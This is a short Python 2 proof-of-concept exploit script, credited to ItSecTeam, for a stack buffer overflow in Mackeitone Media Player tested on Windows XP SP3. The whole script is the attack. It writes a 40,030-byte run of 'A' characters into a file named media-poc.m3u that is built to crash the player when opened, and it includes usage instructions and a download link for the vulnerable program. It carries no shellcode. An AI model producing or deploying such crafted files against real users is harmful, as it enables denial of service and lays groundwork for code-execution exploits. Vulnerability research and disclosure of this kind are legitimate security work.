#! /usr/bin/python
#
# #############################################################################
# Mackeitone Media Player (.m3u file) stack buffer Overflow 
# download link: http://www.makeitone.net/downloads/MakeitOne-MediaPlayerv1.00.exe
# Tested in : Windows XP SP3
# Credit : ItSecTeam
# mail : Bug@ItSecTeam.com
# Web:  WwW.ITSecTeam.com
# Find by: PLATEN @ ItSecTeam
# Special Tanks : M3hr@n.S - B3hz4d - Cdef3nder 
#        Usage: ./MAckeitone-poc.py
# #############################################################################
#
print """
[~] Mackeitone Media Player (.m3u file) stack  Overflow  poc
[~] mail : Bug@ItSecTeam.com
[~] Web:  WwW.ITSecTeam.com
[~] Find by: hoshang jafari a.k.a (PLATEN) @ ItSecTeam               
"""

data= "\x41" *40030
try:
	file=open("media-poc.m3u",'w')
	file.write( data )
	file.close()
	print   ("[+] File created successfully: media-poc.m3u" )
except:
	print "[-] Error cant write file to system\n"